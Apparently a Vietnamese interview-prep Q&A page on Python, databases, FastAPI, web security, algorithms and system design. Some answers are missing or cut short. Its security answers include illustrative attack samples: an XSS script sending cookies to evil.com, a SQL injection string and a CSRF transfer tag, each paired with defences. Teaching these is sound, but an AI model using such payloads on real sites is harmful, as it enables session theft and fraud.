Q1 GIL là gì và tại sao nó tồn tại? ▼

GIL (Global Interpreter Lock) là mutex trong CPython ngăn nhiều thread chạy Python bytecode cùng lúc, dù có nhiều CPU core.

Tồn tại vì CPython dùng reference counting để quản lý memory — GIL bảo vệ counter đó khỏi race condition mà không cần lock từng object riêng lẻ.

Q2 GIL ảnh hưởng thế nào đến multithreading? ▼
  • I/O-bound (HTTP call, DB query, file read): thread release GIL khi chờ I/O → multithreading vẫn hiệu quả.
  • CPU-bound (tính toán nặng): các thread tranh GIL nhau → không tận dụng được multi-core.

Giải pháp cho CPU-bound: dùng multiprocessing — mỗi process có GIL riêng.

Q4 async/await hoạt động như thế nào? ▼

async def tạo coroutine — hàm có thể tạm dừng tại await để nhường control cho event loop, rồi tiếp tục khi I/O xong.

Event loop là vòng lặp duy nhất lên lịch và chạy các coroutine, không spawn thread mới. Tổng concurrency cao mà chỉ dùng một thread.

import asyncio

async def step(name, delay):
    print(f"{name}: start")
    await asyncio.sleep(delay)   # nhường control, không block
    print(f"{name}: done")

async def main():
    await asyncio.gather(step("A", 2), step("B", 1))
    # Output: A start → B start → B done → A done  (~2s, không phải 3s)

asyncio.run(main())
Q5 Sự khác biệt giữa asyncio.gather và asyncio.wait? ▼
  • gather(*coros): chạy song song, trả về list kết quả theo thứ tự, nếu một cái raise exception thì toàn bộ fail (mặc định).
  • wait(tasks): linh hoạt hơn — có thể lấy FIRST_COMPLETED, FIRST_EXCEPTION, kiểm tra từng task riêng. Phù hợp khi cần control từng task độc lập.
Q6 Generator là gì? Khi nào dùng? ▼

Generator là hàm dùng yield — tạo ra iterator lazy, không load toàn bộ data vào memory.

Dùng khi: xử lý file/dataset lớn, pipeline xử lý tuần tự, cần tiết kiệm memory.

def read_chunks(file_path, size=1024):
    with open(file_path) as f:
        while chunk := f.read(size):
            yield chunk   # Không load toàn bộ file vào RAM
Q7 __slots__ dùng để làm gì? ▼

Mặc định mỗi instance Python có __dict__ (tốn ~200-400 bytes). __slots__ khai báo cố định các attribute → loại bỏ __dict__, tiết kiệm 40-60% memory.

Dùng khi tạo hàng triệu object cùng loại (tick data, transaction record).

class Transaction:
    __slots__ = ("id", "amount", "status")
Q8 Decorator là gì? Viết một decorator đơn giản. ▼

Decorator là hàm nhận hàm khác làm input, bọc thêm logic, trả về hàm mới. Dùng cho: logging, timing, retry, auth check, caching.

def log_call(func):
    @functools.wraps(func)
    def wrapper(*args, **kwargs):
        print(f"Calling {func.__name__}")
        return func(*args, **kwargs)
    return wrapper

@log_call
def process_payment(amount): ...

Giữ nguyên metadata của hàm gốc (__name__, __doc__, __module__) sau khi bọc decorator. Không có nó, func.__name__ trả về "wrapper" thay vì tên hàm thật — gây khó debug và docs sai.

Q10 Context manager là gì? Cách implement? ▼

Object đảm bảo resource được khởi tạo và giải phóng đúng cách dù có exception. Implement bằng __enter__/__exit__ hoặc @contextmanager.

from contextlib import contextmanager

@contextmanager
def transaction(conn):
    try:
        yield conn
        conn.commit()
    except:
        conn.rollback()
        raise
Q11 Phân biệt deepcopy vs shallow copy. ▼
  • Shallow copy (copy.copy): tạo object mới nhưng nested object bên trong vẫn là reference đến object cũ.
  • Deep copy (copy.deepcopy): tạo hoàn toàn độc lập, copy đệ quy tất cả nested object.

Dùng deepcopy khi cần thay đổi nested data mà không ảnh hưởng bản gốc.

Q12 List comprehension vs map() — khi nào dùng cái nào? ▼
  • List comprehension: dễ đọc hơn, Pythonic, phù hợp phần lớn trường hợp.
  • map(): trả về iterator (lazy) — tốt hơn khi không cần list đầy đủ ngay, hoặc khi truyền vào hàm có sẵn.
squares = [x**2 for x in range(100)]      # list comprehension — rõ ràng
result  = map(str, filter(lambda x: x > 0, data))  # lazy, tiết kiệm memory
Q13 *args và **kwargs là gì? ▼
  • *args: nhận số lượng positional argument tùy ý, đóng gói thành tuple.
  • **kwargs: nhận số lượng keyword argument tùy ý, đóng gói thành dict.

Dùng để viết hàm linh hoạt, wrapper function, decorator truyền argument xuống hàm gốc.

Q14 Python quản lý memory như thế nào? ▼

CPython dùng reference counting — mỗi object có counter, khi counter về 0 thì giải phóng ngay.

Ngoài ra có cyclic garbage collector để phát hiện và thu hồi reference cycle (A → B → A).

Memory pool (pymalloc) tái dùng block nhỏ để giảm overhead gọi malloc.

Q17 Phân biệt classmethod vs staticmethod vs instance method. ▼
  • Instance method: nhận self → truy cập instance và class.
  • @classmethod: nhận cls → truy cập class, không cần instance. Dùng cho factory method.
  • @staticmethod: không nhận self hay cls → hàm thuần túy đặt trong class cho gọn.
class Payment:
    @classmethod
    def from_dict(cls, data):         # Factory
        return cls(data["amount"])

    @staticmethod
    def validate(amount) -> bool:     # Utility
        return amount > 0
Q18 __init__ vs __new__ khác nhau thế nào? ▼
  • __new__: tạo ra instance mới (allocate memory), gọi trước __init__. Ít khi override trừ Singleton hoặc metaclass.
  • __init__: khởi tạo instance đã tồn tại (set attribute).
class Singleton:
    _instance = None
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
        return cls._instance

Q1 ACID là gì? Giải thích từng tính chất. ▼
  • Atomicity: Transaction hoặc thành công toàn bộ, hoặc rollback toàn bộ — không có trạng thái nửa vời.
  • Consistency: Dữ liệu luôn chuyển từ trạng thái hợp lệ này sang trạng thái hợp lệ khác (constraints, triggers không vi phạm).
  • Isolation: Các transaction đồng thời không thấy kết quả trung gian của nhau.
  • Durability: Sau khi commit, dữ liệu ghi vĩnh viễn dù hệ thống crash (WAL log).
Q2 Clustered Index vs Non-Clustered Index khác nhau thế nào? ▼
  • Clustered: Dữ liệu vật lý sắp xếp theo index. Mỗi bảng chỉ có một (thường là Primary Key). Lookup rất nhanh vì data nằm ngay trong leaf node.
  • Non-Clustered: Index riêng biệt, leaf node chứa pointer đến row thật. Lookup cần 2 bước: tìm index → follow pointer. Một bảng có nhiều non-clustered index.
Q3 Khi nào nên tạo index? Khi nào không nên? ▼

Nên tạo: Column thường xuất hiện trong WHERE, JOIN, ORDER BY; column có cardinality cao (nhiều giá trị distinct).

Không nên: Bảng nhỏ (<1000 rows) — full scan nhanh hơn; column ít distinct value (status chỉ 2-3 giá trị); bảng write-heavy — mỗi INSERT/UPDATE/DELETE phải cập nhật tất cả index.

Q4 Composite Index là gì? Rule nào khi thiết kế? ▼

Index trên nhiều column. Rule quan trọng: đặt column equality trước, range sau; column có selectivity cao lên trước.

-- Phục vụ: WHERE user_id = 1 AND created_at > '2026-01-01'
-- Phục vụ: WHERE user_id = 1
-- KHÔNG phục vụ: WHERE created_at > '2026-01-01' (bỏ qua leading column)
CREATE INDEX idx ON orders(user_id, created_at DESC);

Q6 Dirty Read, Non-repeatable Read, Phantom Read là gì? ▼
  • Dirty Read: Đọc data chưa commit của T1. T1 rollback → T2 đọc sai.
  • Non-repeatable Read: Đọc lại cùng row trong transaction thấy kết quả khác (T2 đã UPDATE và commit ở giữa).
  • Phantom Read: Đọc lại cùng query thấy số row khác (T2 đã INSERT thêm row mới thoả điều kiện WHERE).
Q7 Optimistic Lock vs Pessimistic Lock — khi nào dùng cái nào? ▼
  • Pessimistic (SELECT FOR UPDATE): Lock ngay khi đọc. Dùng khi conflict rate cao. Đơn giản nhưng giảm throughput, dễ deadlock.
  • Optimistic (version column): Không lock khi đọc, kiểm tra version khi ghi, retry nếu conflict. Dùng khi conflict rate thấp, cần throughput cao.
-- Optimistic: chỉ update nếu version chưa đổi
UPDATE accounts
SET balance = balance - 100, version = version + 1
WHERE id = 1 AND version = 5;
-- 0 rows affected → ai đó đã update trước → retry
Q8 N+1 Query Problem là gì? Cách fix? ▼

Thay vì 1 query JOIN, code chạy 1 query lấy N row rồi N query riêng cho từng row → tổng N+1 queries, cực chậm.

# BAD: 1 + 100 queries
users = db.fetch("SELECT id FROM users LIMIT 100")
for u in users:
    orders = db.fetch("SELECT * FROM orders WHERE user_id=$1", u["id"])

# GOOD: 2 queries
users = db.fetch("SELECT id FROM users LIMIT 100")
orders = db.fetch(
    "SELECT * FROM orders WHERE user_id = ANY($1)",
    [u["id"] for u in users]
)
Q9 EXPLAIN ANALYZE dùng để làm gì? ▼

Hiển thị query execution plan thực tế — DB chọn index nào, join strategy gì, bao nhiêu rows được scan, thời gian thực tế từng bước.

Dùng để tìm slow query, phát hiện Sequential Scan không mong muốn, kiểm tra index có được dùng không.

EXPLAIN ANALYZE
SELECT * FROM orders WHERE user_id = 1 AND created_at > '2026-01-01';
-- Nếu thấy "Seq Scan" thay vì "Index Scan" → cần tạo/kiểm tra index

Q11 Cache-Aside vs Write-Through — khác nhau thế nào? ▼
  • Cache-Aside (Lazy): App đọc cache trước → miss thì đọc DB → set cache. Data chỉ vào cache khi được đọc. Có thể stale trong thời gian TTL.
  • Write-Through: Mỗi lần ghi DB đồng thời ghi cache luôn. Cache luôn fresh nhưng tăng write latency và ghi cả data ít được đọc.

Thực tế: thường dùng Cache-Aside + TTL ngắn cho simplicity.

Q12 Cache Stampede là gì? Cách xử lý? ▼

Khi một cache key hết TTL, nhiều request đồng thời hit miss → tất cả cùng lúc query DB → DB quá tải.

Giải pháp: Dùng distributed lock (Redis SET NX) — chỉ cho 1 request rebuild cache, các request còn lại chờ hoặc trả về stale data. Hoặc dùng probabilistic early expiration — refresh cache trước khi hết hạn.

Q13 Tại sao không dùng FLOAT/DOUBLE để lưu tiền tệ? ▼

FLOAT là binary floating point — không biểu diễn chính xác nhiều số thập phân.

>>> 0.1 + 0.2
0.30000000000000004   # Sai!

from decimal import Decimal
>>> Decimal("0.1") + Decimal("0.2")
Decimal('0.3')        # Đúng

Dùng NUMERIC(18,4) trong DB và Decimal trong Python. Sai lệch nhỏ nhân hàng triệu giao dịch thành số tiền lớn và không khớp audit.

Q14 Sharding vs Partitioning khác nhau thế nào? ▼
  • Partitioning: Chia bảng lớn thành nhiều partition trong cùng DB instance. Transparent với application. Dùng Range (theo ngày) hoặc Hash.
  • Sharding: Chia data ra nhiều DB instance khác nhau (horizontal scaling). Application phải biết shard nào. Phức tạp hơn nhiều, khó cross-shard query/transaction.

Thứ tự ưu tiên: vertical scale → read replica → partitioning → sharding.

Q15 Deadlock là gì? Làm sao tránh? ▼

Deadlock xảy ra khi T1 giữ lock A chờ lock B; T2 giữ lock B chờ lock A → cả hai chờ nhau mãi.

Tránh: Luôn acquire lock theo cùng thứ tự (ví dụ: lock account có ID nhỏ hơn trước); giảm thời gian giữ lock; dùng NOWAIT hoặc timeout; DB tự detect và kill một transaction (victim).

-- Luôn lock theo thứ tự ID tăng dần
SELECT * FROM accounts WHERE id IN (1, 2) ORDER BY id FOR UPDATE;
Q16 Connection Pool là gì? Tại sao quan trọng? ▼

Pool là tập hợp DB connection được tạo sẵn và tái dùng. Tạo TCP connection + TLS + DB auth tốn 100-500ms. Nếu mỗi request tạo connection mới: chậm và vượt giới hạn DB (PostgreSQL mặc định 100 connections).

# Tạo một lần ở startup
pool = await asyncpg.create_pool(dsn=..., min_size=5, max_size=20)

# Mỗi request mượn từ pool
async with pool.acquire() as conn:
    result = await conn.fetch("SELECT ...")
Q17 UUID vs Auto-increment ID — khi nào dùng cái nào? ▼
  • Auto-increment: Đơn giản, nhỏ (8 bytes), sequential → insert nhanh. Nhưng expose thứ tự, không an toàn trong URL, không phù hợp distributed system.
  • UUID v4: Random, globally unique, an toàn. Nhưng 16 bytes, random → nhiều page split trong B-tree → chậm hơn ở scale lớn.
  • UUID v7 (khuyến nghị): Time-ordered — kết hợp ưu điểm cả hai: sequential insert + globally unique.
Q18 Immutable Ledger Pattern là gì? Tại sao dùng trong fintech? ▼

Thay vì UPDATE balance trực tiếp, mỗi thay đổi tạo một row mới (chỉ INSERT, không UPDATE/DELETE). Balance = tổng tất cả transaction của account.

Lý do: Audit trail đầy đủ, dễ reconcile, rollback tự nhiên (thêm compensating transaction), không mất lịch sử.

-- Không UPDATE balance. Chỉ INSERT entries:
INSERT INTO ledger (account_id, type, amount, balance_after)
VALUES (1, 'DEBIT', 500.00, 4500.00);
Q19 Tại sao cần Idempotency Key trong payment API? ▼

Network không đáng tin cậy — client có thể retry khi timeout mà không biết server đã xử lý chưa. Không có idempotency → cùng payment bị xử lý 2 lần (duplicate charge).

Idempotency key là unique ID do client tạo, gửi kèm request. Server lưu kết quả theo key — nếu thấy key đã tồn tại, trả về kết quả cũ thay vì xử lý lại.

Client → POST /payments + Idempotency-Key: uuid-abc
Server: chưa thấy key → xử lý → lưu kết quả

Client retry → POST /payments + Idempotency-Key: uuid-abc
Server: đã thấy key → trả kết quả cũ, không xử lý lại
Q20 CAP Theorem là gì? Áp dụng thực tế thế nào? ▼

Distributed system không thể đồng thời đảm bảo cả 3:

  • Consistency: Mọi read đều thấy write mới nhất.
  • Availability: Mọi request đều nhận được response.
  • Partition Tolerance: Hệ thống vẫn hoạt động khi network partition.

Vì Partition luôn xảy ra trong thực tế, phải chọn CP hoặc AP:

  • CP (PostgreSQL, HBase): Đảm bảo consistency, có thể từ chối request khi partition. Phù hợp banking.
  • AP (Cassandra, DynamoDB): Luôn available, chấp nhận eventual consistency. Phù hợp social feed, analytics.

Q1 FastAPI lifespan hoạt động như thế nào? Tại sao không dùng @app.on_event? ▼

lifespan là async context manager — code trước yield chạy lúc startup, sau yield chạy lúc shutdown. Dùng để khởi tạo và đóng resource một lần (DB pool, Redis, HTTP client).

@app.on_event đã deprecated từ FastAPI 0.93 — lifespan an toàn hơn vì đảm bảo cleanup luôn chạy dù startup lỗi giữa chừng.

@asynccontextmanager
async def lifespan(app: FastAPI):
    app.state.db = await asyncpg.create_pool(dsn=...)  # startup
    yield
    await app.state.db.close()                          # shutdown

app = FastAPI(lifespan=lifespan)
Q2 Dependency Injection trong FastAPI là gì? Cách hoạt động? ▼

DI cho phép inject dependencies (DB session, current user, config) vào route handler qua Depends(). FastAPI tự resolve dependency graph — nếu nhiều route dùng cùng dependency trong một request, chỉ gọi một lần (use_cache=True mặc định). Hỗ trợ sub-dependency lồng nhau.

async def get_db(request: Request):
    async with request.app.state.db.acquire() as conn:
        yield conn   # Trả connection về pool sau khi request xong

@app.get("/users/{id}")
async def get_user(id: int, db=Depends(get_db)):
    return await db.fetchrow("SELECT * FROM users WHERE id=$1", id)
Q3 Middleware là gì? Thứ tự thực thi thế nào? ▼

Middleware là layer bọc quanh toàn bộ request/response pipeline — chạy trước route handler (pre-processing) và sau khi có response (post-processing). Thứ tự thực thi LIFO — middleware thêm sau add_middleware() chạy trước (bọc ngoài cùng).

Request  → Middleware C → Middleware B → Middleware A → Route Handler
Response ← Middleware C ← Middleware B ← Middleware A ←
(A add_middleware trước, chạy gần handler nhất)

Dùng cho: logging, request ID, auth, rate limit, CORS.

Q4 Phân biệt HTTPException, custom exception handler, và RequestValidationError. ▼
  • HTTPException: raise thủ công trong route, FastAPI tự convert thành JSON với status code chỉ định.
  • Custom exception handler: @app.exception_handler(MyError) bắt custom exception class, format response theo ý.
  • RequestValidationError: Pydantic tự raise khi request body/param không valid. Override để format lỗi đồng nhất.
@app.exception_handler(RequestValidationError)
async def validation_handler(request, exc):
    return JSONResponse(status_code=422, content={
        "error": "VALIDATION_ERROR",
        "fields": [{"field": e["loc"][-1], "msg": e["msg"]} for e in exc.errors()]
    })

Q6 Async route vs sync route — khi nào dùng cái nào? ▼

Q1 Authentication vs Authorization khác nhau thế nào? ▼
  • Authentication (AuthN): Xác minh bạn là ai — "Đây có phải John không?" (login, JWT verify).
  • Authorization (AuthZ): Xác minh bạn được phép làm gì — "John có quyền xem account 123 không?" (role check, permission).

Thứ tự luôn là: AuthN trước → AuthZ sau. Không thể authorize khi chưa biết identity.

Q2 JWT là gì? Cấu trúc gồm những phần nào? ▼

JWT là token tự chứa thông tin (stateless), gồm 3 phần base64url-encoded ngăn cách bởi dấu .:

  • Header: {"alg": "HS256", "typ": "JWT"}
  • Payload: {"sub": "user_123", "exp": 1720000, "roles": ["user"]}
  • Signature: HMAC-SHA256(base64(header) + "." + base64(payload), secret)

Payload chỉ encoded, không encrypted → ai có token đều decode được → không đặt data nhạy cảm vào payload.

Q3 Access Token vs Refresh Token — tại sao cần cả hai? ▼
  • Access Token: short-lived (15 phút), gửi kèm mọi API request. Nếu bị đánh cắp, thiệt hại giới hạn trong 15 phút.
  • Refresh Token: long-lived (30 ngày), lưu trong httpOnly cookie (JS không đọc được). Chỉ dùng để xin AT mới khi hết hạn.

Nếu chỉ có 1 token long-lived, bị đánh cắp → thiệt hại cả tháng. Tách ra thì AT ngắn hạn, RT chỉ đi qua 1 endpoint cụ thể dễ monitor và revoke.

Q4 JWT có nhược điểm gì? Làm sao handle logout? ▼

JWT stateless — sau khi issue, server không thể revoke trước khi hết TTL. Logout chỉ xóa token ở client-side, server vẫn chấp nhận token cũ.

Giải pháp: Lưu JWT ID (jti) vào Redis blacklist khi logout, mỗi request check blacklist.

async def logout(payload=Depends(verify_token), redis=Depends(get_redis)):
    ttl = payload["exp"] - int(time.time())
    await redis.setex(f"blacklist:{payload['jti']}", ttl, "1")

async def verify_token(token, redis=Depends(get_redis)):
    payload = jwt.decode(token, SECRET, algorithms=["HS256"])
    if await redis.exists(f"blacklist:{payload['jti']}"):
        raise HTTPException(401, "Token revoked")
    return payload
Q5 OAuth 2.0 là gì? Authorization Code Flow hoạt động thế nào? ▼

OAuth 2.0 là framework ủy quyền — cho phép app bên thứ ba truy cập resource của user mà không cần password của user.

1. Client redirect user → Auth Server:
   GET /authorize?client_id=...&redirect_uri=...&scope=openid&state=xyz

2. User login + approve → Auth Server redirect về:
   GET /callback?code=AUTH_CODE&state=xyz

3. Client exchange code (server-to-server, có client_secret):
   POST /token { grant_type: authorization_code, code: AUTH_CODE }

4. Auth Server → { access_token, refresh_token, id_token }

Code đi qua browser (có thể bị log), nhưng exchange code → token là server-to-server nên an toàn.

Q6 HTTPS / TLS hoạt động thế nào? ▼

TLS mã hóa toàn bộ data truyền giữa client và server:

1. Client Hello: "Tôi hỗ trợ TLS 1.3, cipher: AES-256-GCM"
2. Server Hello: chọn cipher + gửi certificate
3. Client verify certificate (chữ ký từ CA tin cậy)
4. Key exchange (ECDHE) → shared symmetric key
5. Từ đây mọi data đều mã hóa bằng symmetric key

Certificate Pinning (mobile banking): App pin sha256 của server cert, từ chối kết nối nếu không khớp — chống MITM dù attacker có self-signed CA.

Q7 SQL Injection là gì? Cách phòng chống? ▼

Attacker chèn SQL vào input để thay đổi query gốc, có thể đọc/xóa toàn bộ DB.

# BAD — nguy hiểm
name = "' OR '1'='1"
db.execute(f"SELECT * FROM users WHERE name = '{name}'")
# → WHERE name = '' OR '1'='1'  ← trả về toàn bộ users!

# GOOD — parameterized query, DB tự escape
await db.execute("SELECT * FROM users WHERE name = $1", name)

Phòng chống: Luôn dùng parameterized query. Không bao giờ format string SQL. Thêm WAF ở API Gateway.

Q8 XSS (Cross-Site Scripting) là gì? Cách phòng chống? ▼

Attacker inject script độc hại vào trang web, browser của victim chạy script đó — đánh cắp cookie, session, redirect.

<!-- Stored XSS: attacker lưu vào DB, victim load trang → script chạy -->
Tên: <script>document.location='http://evil.com?c='+document.cookie</script>

Phòng chống:

  • Escape HTML output phía server (html.escape())
  • Header Content-Security-Policy: default-src 'self' — browser từ chối script từ origin khác
  • Cookie httpOnly=True — JS không đọc được cookie dù XSS thành công
Q9 CSRF (Cross-Site Request Forgery) là gì? Cách phòng chống? ▼

Attacker lừa browser victim gửi request đến server mà victim đã login — browser tự đính kèm cookie mà không cần attacker biết giá trị.

<!-- evil.com -->
<img src="https://bank.com/transfer?to=attacker&amount=1000">
<!-- Browser victim tự gửi kèm cookie bank.com! -->

Phòng chống:

  • SameSite=Strict cookie: browser không gửi cookie trong cross-site request
  • CSRF Token: form ẩn chứa token random, server verify
  • SPA + JWT trong Authorization header: không bị CSRF vì browser không tự đính kèm header custom
Q10 Password hashing — tại sao dùng bcrypt thay vì MD5/SHA1? ▼

MD5/SHA1 là hash nhanh → attacker brute-force hàng tỷ password/giây bằng GPU.

bcrypt/argon2 có work factor (cost) — cố tình chậm (~100-300ms mỗi hash). Dù GPU mạnh, brute-force vẫn cực kỳ tốn thời gian.

import bcrypt

# Hash khi đăng ký
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))

# Verify khi login — timing-safe
is_valid = bcrypt.checkpw(password.encode(), hashed)

# KHÔNG dùng:
import hashlib
hashlib.md5(password.encode()).hexdigest()  # Crack trong vài giây!

Q16 Rate Limiting — các chiến lược phổ biến? ▼
  • Fixed Window: đếm trong window cố định (0-60s, 60-120s). Đơn giản nhưng có burst tại ranh giới window.
  • Sliding Window: cửa sổ di chuyển, mượt hơn. Dùng Redis Sorted Set.
  • Token Bucket: bucket chứa token, mỗi request dùng 1, bucket refill theo thời gian. Cho phép burst ngắn có kiểm soát.
# Sliding window bằng Redis sorted set
async def check_rate_limit(redis, key, limit=100, window=60):
    now = time.time()
    pipe = redis.pipeline()
    pipe.zremrangebyscore(key, 0, now - window)  # Xóa entry cũ
    pipe.zadd(key, {str(uuid4()): now})
    pipe.zcard(key)
    pipe.expire(key, window)
    _, _, count, _ = await pipe.execute()
    return count <= limit

Q1 Big O Notation là gì? Tại sao quan trọng? ▼

Big O mô tả tốc độ tăng của runtime/memory khi input size (n) tăng — đánh giá algorithm theo worst case.

O(1) < O(log n) < O(n) < O(n log n) < O(n²) < O(2ⁿ)
Dict lookup  Binary search  Linear  Merge sort  Nested loop  Brute force

Quan trọng vì: chọn sai algorithm có thể ổn với 1.000 records nhưng crash với 1 triệu records.

Q3 Stack vs Queue — khác nhau thế nào? Ứng dụng thực tế? ▼

  • Queue: FIFO — enqueue một đầu, dequeue đầu kia. Dùng cho: BFS, task queue, rate limiting.

Q4 Hash Table hoạt động thế nào? Collision xử lý thế nào? ▼

Hash Table dùng hash function để map key → index trong array. Lookup/insert/delete trung bình O(1).

Collision (2 key cùng hash):

  • Chaining: mỗi bucket là linked list.

Q5 Binary Search — điều kiện và cách implement? ▼

def binary_search(arr, target):
    lo, hi = 0, len(arr) - 1
    while lo <= hi:
        mid = (lo + hi) // 2
        if arr[mid] == target:   return mid
        elif arr[mid] < target:  lo = mid + 1
        else:                    hi = mid - 1
    return -1

Q6 BFS vs DFS — khác nhau thế nào? Khi nào dùng cái nào? ▼

  • DFS (Stack/recursion): đi sâu một nhánh trước. Tìm tất cả path, detect cycle, topological sort.
from collections import deque

def bfs(graph, start):
    visited, queue = {start}, deque([start])
    while queue:
        node = queue.popleft()
        for nb in graph[node]:
            if nb not in visited:
                visited.add(nb); queue.append(nb)

def dfs(graph, node, visited=None):
    if visited is None: visited = set()
    visited.add(node)
    for nb in graph[node]:
        if nb not in visited: dfs(graph, nb, visited)

Q9 LRU Cache — implement thế nào? ▼

LRU (Least Recently Used): khi cache đầy, evict item ít dùng nhất. Implement bằng OrderedDict (dict + doubly linked list) → O(1) cho cả get và put.

from collections import OrderedDict

class LRUCache:
    def __init__(self, capacity):
        self.cap = capacity
        self.cache = OrderedDict()

    def get(self, key):
        if key not in self.cache: return -1
        self.cache.move_to_end(key)    # Mark recently used
        return self.cache[key]

    def put(self, key, value):
        if key in self.cache: self.cache.move_to_end(key)
        self.cache[key] = value
        if len(self.cache) > self.cap:
            self.cache.popitem(last=False)  # Evict LRU
Q10 Dynamic Programming là gì? Khi nào nhận ra được DP? ▼

DP giải bài có overlapping subproblems + optimal substructure bằng cách lưu kết quả sub-problem để tránh tính lại.

Nhận ra DP khi: bài hỏi min/max/count/feasibility, chia được thành subproblem cùng dạng, brute force có exponential complexity.

# Coin change: số coin tối thiểu để đổi amount
def coin_change(coins, amount):
    dp = [float("inf")] * (amount + 1)
    dp[0] = 0
    for i in range(1, amount + 1):
        for coin in coins:
            if coin <= i:
                dp[i] = min(dp[i], dp[i - coin] + 1)
    return dp[amount] if dp[amount] != float("inf") else -1
# O(amount × coins) thay vì O(2^amount) brute force
Q11 Two Sum — giải O(n) thế nào? ▼

Dùng hash map lưu value → index khi duyệt qua. Mỗi phần tử check xem complement (target - num) đã thấy chưa.

def two_sum(nums, target):
    seen = {}   # value → index
    for i, num in enumerate(nums):
        complement = target - num
        if complement in seen:
            return (seen[complement], i)
        seen[num] = i
    return (-1, -1)

# [2, 7, 11, 15], target=9 → (0, 1)
# O(n) time, O(n) space — tốt hơn brute force O(n²)

Q13 Sliding Window — pattern và khi nào dùng? ▼

Dùng khi bài hỏi về subarray/substring liên tiếp — tránh nested loop O(n²).

# Max sum subarray kích thước k — O(n)
def max_sum(nums, k):
    window = sum(nums[:k])
    best = window
    for i in range(k, len(nums)):
        window += nums[i] - nums[i - k]   # Trượt cửa sổ
        best = max(best, window)
    return best

# Ứng dụng: đếm request trong sliding window (rate limiting)
# Longest substring không ký tự lặp → variable-size window

def reverse(head):
    prev, curr = None, head
    while curr:
        nxt = curr.next    # Lưu next
        curr.next = prev   # Đảo chiều
        prev = curr        # Tiến prev
        curr = nxt         # Tiến curr
    return prev            # prev là head mới

# 1→2→3→None  thành  3→2→1→None
# O(n) time, O(1) space

def has_cycle(head) -> bool:
    slow = fast = head
    while fast and fast.next:
        slow = slow.next
        fast = fast.next.next
        if slow is fast:   # Gặp nhau → có cycle
            return True
    return False
# O(n) time, O(1) space — không cần Set lưu visited

Q17 Topological Sort là gì? Ứng dụng thực tế? ▼

Sắp xếp node của DAG sao cho mọi edge u→v thì u xuất hiện trước v. Chỉ áp dụng với graph không có cycle.

from collections import deque

def topo_sort(graph, in_degree):
    queue = deque(n for n in graph if in_degree[n] == 0)
    result = []
    while queue:
        node = queue.popleft(); result.append(node)
        for nb in graph[node]:
            in_degree[nb] -= 1
            if in_degree[nb] == 0: queue.append(nb)
    return result if len(result) == len(graph) else []  # [] = có cycle

Ứng dụng: CI/CD pipeline task ordering, package dependency resolution, DB migration order.

Q18 Trie (Prefix Tree) là gì? Khi nào dùng? ▼

Trie lưu các string theo từng ký tự — prefix chung dùng chung node. Search/insert O(L) với L là độ dài string.

class TrieNode:
    def __init__(self): self.children = {}; self.is_end = False

class Trie:
    def __init__(self): self.root = TrieNode()

    def insert(self, word):
        node = self.root
        for ch in word:
            node = node.children.setdefault(ch, TrieNode())
        node.is_end = True

    def starts_with(self, prefix) -> bool:
        node = self.root
        for ch in prefix:
            if ch not in node.children: return False
            node = node.children[ch]
        return True

Ứng dụng: autocomplete, spell checker, IP routing table.

Q4 Circuit Breaker pattern là gì? Tại sao cần? ▼

Khi service downstream liên tục fail, thay vì tiếp tục gọi và chờ timeout → Circuit Breaker "mở" circuit, trả về fallback ngay. Sau timeout, thử lại (half-open).

CLOSED → (error rate > 50%) → OPEN → (timeout 30s) → HALF-OPEN
                                                          ↓ success → CLOSED
                                                          ↓ fail    → OPEN

Lợi ích: tránh cascade failure, giảm load cho service đang lỗi, fast-fail thay vì chờ timeout.

Q7 Làm sao đảm bảo High Availability (HA)? ▼

HA = loại bỏ single point of failure + tự động recover.

  • Multiple instances: ít nhất 2 pod, load balancer phân phối traffic.
  • Health check: liveness + readiness probe → K8s tự restart pod fail.
  • Multi-AZ: deploy across nhiều Availability Zone — 1 AZ down, AZ khác vẫn chạy.
  • DB failover: RDS Multi-AZ với auto-failover.
  • Graceful shutdown: drain traffic trước khi kill pod.

Target: 99.9% = 8.7 giờ downtime/năm. 99.99% = 52 phút/năm.

Q18 Eventual Consistency có vấn đề gì với banking? ▼

  • Dùng SELECT FOR UPDATE đảm bảo đọc latest committed value.
  • Dùng SERIALIZABLE isolation level nếu cần.
